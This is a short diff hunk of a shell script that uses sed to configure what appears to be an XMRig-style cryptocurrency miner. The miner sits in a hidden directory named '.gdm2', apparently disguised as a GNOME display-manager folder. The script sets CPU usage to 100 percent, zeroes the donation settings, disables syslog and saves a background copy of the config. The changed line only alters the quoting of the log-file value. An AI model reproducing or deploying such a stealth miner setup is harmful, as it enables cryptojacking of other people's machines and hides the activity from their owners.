@@ -238,7 +238,7 @@ sed -i 's/"enabled": false,/"enabled": true,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-level": 1,/"donate-level": 0,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-over-proxy": 1,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "log",#' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'log'",#' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
